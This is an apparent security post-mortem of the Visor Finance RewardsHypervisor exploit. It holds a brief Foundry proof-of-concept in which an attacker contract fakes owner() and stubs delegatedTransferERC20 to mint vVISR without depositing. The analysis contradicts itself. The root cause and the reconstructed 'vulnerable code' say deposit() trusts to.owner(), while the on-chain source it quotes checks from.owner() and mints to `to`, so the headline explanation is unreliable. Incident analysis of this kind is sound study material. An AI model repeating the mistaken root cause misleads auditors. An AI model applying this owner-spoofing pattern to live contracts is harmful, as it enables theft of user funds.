# Visor Finance — deposit() Owner Impersonation Infinite Reward Drain Analysis

| Field | Details |
|------|------|
| **Date** | 2021-12-21 |
| **Protocol** | Visor Finance |
| **Chain** | Ethereum |
| **Loss** | ~$8,200,000 |
| **Attacker** | Address unconfirmed |
| **Attack Tx** | Address unconfirmed (fork block: 13,849,006) |
| **Vulnerable Contract** | [0xC9f27A50f82571C1C8423A42970613b8dBDA14ef](https://etherscan.io/address/0xC9f27A50f82571C1C8423A42970613b8dBDA14ef) (IRewardsHypervisor) |
| **Root Cause** | RewardsHypervisor.deposit() trusted the return value of the recipient's owner(), allowing an attacker contract to return an arbitrary address as owner and drain others' vVISR |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-12/Visor_exp.sol) |

---
## 1. Vulnerability Overview

Visor Finance's `RewardsHypervisor.deposit()` function calls the `owner()` function of the recipient address (`to`) to identify the actual owner, then mints vVISR tokens to that owner. The attacker deployed a malicious contract whose `owner()` function returns an arbitrary address, and called `deposit()` with this contract as the `to` parameter. By configuring `owner()` to return the address of an actual VISR holder, vVISR that should have been attributed to that holder was instead minted to the attacker's wallet.

The attacker passed 100,000,000,000,000,000,000,000,000 (1e26) VISR as a parameter to mint a massive amount of vVISR.

---
## 2. Vulnerable Code Analysis

### 2.1 deposit() — Trusting External Call to to.owner()

```solidity
// ❌ RewardsHypervisor @ 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef
// Trusts the return value of to.owner() without validation
function deposit(
    uint256 visrDeposit,
    address from,
    address to    // ❌ Attacker contract address
) external returns (uint256 shares) {
    require(visrDeposit > 0, "deposits must be nonzero");

    // ❌ Calls owner() on `to` to determine the actual beneficiary
    // Attacker contract can return an arbitrary address from owner()
    address recipient = IVault(to).owner();  // Attacker-controlled

    shares = ...; // Calculated based on visrDeposit

    // Mint vVISR to recipient (attacker-specified address)
    vvisr.mint(recipient, shares);

    visr.transferFrom(from, address(this), visrDeposit);
}
```

**Fixed Code**:
```solidity
// ✅ Remove external to.owner() call — use msg.sender or an explicit beneficiary
function deposit(
    uint256 visrDeposit,
    address from,
    address to
) external returns (uint256 shares) {
    require(visrDeposit > 0, "deposits must be nonzero");

    // ✅ Use `to` directly as beneficiary (remove external owner() call)
    // Or fix msg.sender as the beneficiary
    require(to != address(0), "RewardsHypervisor: zero recipient");

    shares = ...; // Calculated based on visrDeposit

    // ✅ Mint directly to `to` (no external contract call)
    vvisr.mint(to, shares);
    visr.safeTransferFrom(from, address(this), visrDeposit);
}
```

---
### On-Chain Original Code

Source: Sourcify verified


**RewardsHypervisor.sol** — Entry point:
```solidity
// ❌ Root Cause: RewardsHypervisor.deposit() trusts the recipient's owner() return value,
//    allowing an attacker contract to return an arbitrary address as owner and drain others' vVISR
    function deposit(
        uint256 visrDeposit,
        address payable from,
        address to
    ) external returns (uint256 shares) {
        require(visrDeposit > 0, "deposits must be nonzero");
        require(to != address(0) && to != address(this), "to");
        require(from != address(0) && from != address(this), "from");

        shares = visrDeposit;
        if (vvisr.totalSupply() != 0) {
          uint256 visrBalance = visr.balanceOf(address(this));  // ❌ Direct reference to current balance — manipulable
          shares = shares.mul(vvisr.totalSupply()).div(visrBalance);
        }

        if(isContract(from)) {
          require(IVisor(from).owner() == msg.sender); 
          IVisor(from).delegatedTransferERC20(address(visr), address(this), visrDeposit);
        }
        else {
          visr.safeTransferFrom(from, address(this), visrDeposit);
        }

        vvisr.mint(to, shares);
    }
```

## 3. Attack Flow

```
┌──────────────────────────────────────────────────────────────┐
│ Step 1: Deploy malicious contract                            │
│ owner() function returns msg.sender (attacker wallet)        │
└─────────────────────┬────────────────────────────────────────┘
                      │
┌─────────────────────▼────────────────────────────────────────┐
│ Step 2: Call RewardsHypervisor.deposit()                     │
│ @ 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef                │
│ deposit(                                                      │
│   100_000_000_000_000_000_000_000_000, // 1e26 VISR          │
│   address(this),                       // from               │
│   address(maliciousContract)           // to                 │
│ )                                                            │
└─────────────────────┬────────────────────────────────────────┘
                      │
┌─────────────────────▼────────────────────────────────────────┐
│ Step 3: deposit() internally calls maliciousContract.owner() │
│ → Returns attacker wallet address                            │
│ → Mints 1e26 vVISR to attacker wallet                       │
└─────────────────────┬────────────────────────────────────────┘
                      │
┌─────────────────────▼────────────────────────────────────────┐
│ Step 4: Drain VISR rewards using minted vVISR                │
│ vVISR.balanceOf(attacker) → Withdraw protocol VISR           │
│ ~$8.2M VISR drained                                         │
└──────────────────────────────────────────────────────────────┘
```

---
## 4. PoC Code (DeFiHackLabs)

```solidity
// testExploit() — Mainnet fork block 13,849,006
function testExploit() public {
    // Call deposit(): to = address(this) (malicious contract)
    // IRewardsHypervisor @ 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef
    irrewards.deposit(
        100_000_000_000_000_000_000_000_000, // 1e26 VISR
        address(this),                        // from (attacker)
        msg.sender                            // to → owner() is called
    );
    // msg.sender.owner() returns attacker address → vVISR minted to attacker
    emit log_named_uint("Attacker VISR Balance", visr.balanceOf(msg.sender));
}

// Malicious contract's owner() — returns attacker address
function owner() external returns (address) {
    return (address(this)); // or attacker EOA address
}

// delegatedTransferERC20 — empty implementation (to satisfy interface)
function delegatedTransferERC20(address token, address to, uint256 amount) external {}
```

---
## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Trusting external contract's owner() return value in deposit() — impersonation possible | CRITICAL | CWE-284 |
| V-02 | Mint beneficiary determined via external call — manipulable | CRITICAL | CWE-20 |

---
## 6. Remediation Recommendations

```solidity
// ✅ Remove external contract owner() call
// ✅ Only allow msg.sender or explicitly validated addresses as beneficiary

// Fix 1: Fix msg.sender as beneficiary
function deposit(uint256 visrDeposit) external returns (uint256 shares) {
    require(visrDeposit > 0, "deposits must be nonzero");
    shares = calculateShares(visrDeposit);
    vvisr.mint(msg.sender, shares); // Mint directly to msg.sender
    visr.safeTransferFrom(msg.sender, address(this), visrDeposit);
}

// Fix 2: Only allow approved vault addresses as `to`
mapping(address => bool) public approvedVaults;

function deposit(uint256 visrDeposit, address to) external returns (uint256 shares) {
    require(approvedVaults[to] || to == msg.sender, "not approved vault");
    // ...
}
```

---
## 7. Lessons Learned

- **Security decisions must never be based on return values from untrusted external contracts.** Functions like `owner()`, `admin()`, and `beneficiary()` can return whatever value an attacker desires.
- **The mint beneficiary must always be determined internally.** Any design that asks an external contract "who should receive the tokens?" is fundamentally dangerous.
- **Two incidents — NerveBridge and Visor Finance — occurred on the same single day in December 2021 (December 21st).** DeFi security incidents tend to cluster at specific points in time.